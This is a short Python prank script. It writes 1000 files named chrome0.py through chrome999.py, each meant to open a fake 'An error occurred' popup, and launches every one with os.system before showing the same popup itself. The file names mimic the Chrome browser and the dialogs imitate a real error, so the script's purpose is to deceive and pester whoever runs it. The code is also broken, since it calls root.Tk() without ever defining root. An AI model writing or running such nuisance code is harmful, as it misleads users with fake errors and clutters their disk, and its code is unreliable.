import math
from os import system
import tkinter as tk

for x in range(1000):
  with open(f"chrome{x}.py","w") as f:
    f.write("""
import math
from os import system
import tkinter as tk

root.Tk()
root.title('An error occurred')
root.geometry('100x50')

mylabel = tk.Label(root, text='Error', font=('Arial', 18))
mylabel.pack()


root.mainloop()
""")
    system(f"python chrome{x}.py")


root.Tk()
root.title('An error occurred')
root.geometry('100x50')

mylabel = tk.Label(root, text='Error', font=('Arial', 18))
mylabel.pack()


root.mainloop()
